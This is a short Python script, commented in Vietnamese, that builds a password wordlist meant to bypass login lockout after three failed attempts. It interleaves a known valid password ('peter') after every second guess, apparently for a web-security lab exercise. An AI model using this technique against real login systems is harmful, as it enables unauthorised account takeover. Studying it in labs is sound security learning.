# Payload dành cho brut-force protection nếu bị giới hạn số lần thử
# TH ở đây y = 3 (là giới hạn nhập fail)
# note.txt là file chứa password để brute-force
with open("note.txt", "r") as file:
    payloadpw = file.read()
listpw = payloadpw.split('\n')
print(listpw)
print(len(listpw))
y = 0
payload = []
for i in listpw:
    y +=1
    print(i)
    payload.append(i)
    if y%2 == 0:
        print("peter")
        payload.append("peter")
print(payload)
with open("passwd.txt", "w") as file:
    file.write("\n".join(str(item) for item in payload))
